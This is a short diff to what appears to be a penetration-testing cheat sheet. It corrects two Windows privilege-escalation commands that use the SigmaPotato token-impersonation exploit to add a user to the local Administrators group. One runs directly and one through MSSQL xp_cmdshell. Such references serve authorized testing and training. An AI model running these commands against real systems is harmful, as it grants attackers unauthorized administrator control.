@@ -633,7 +633,7 @@ winPEASx64.exe
 
 ### SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
 ```ps
-SigmaPotato.exe "net localgroup administrator <user> /add"
+SigmaPotato.exe "net localgroup Administrators <user> /add"
 ```
 
 ### File Permissions: Everyone [AllAccess] in WinPeas
@@ -812,7 +812,7 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
 
   ### Privesc to local administrator as db_admin
   ```bash
-  xp_cmdshell 'SigmaPotato.exe "net localgroup administrator <user> /add"'
+  xp_cmdshell 'SigmaPotato.exe "net localgroup Administrators <user> /add"'
   ```
 
 </details>
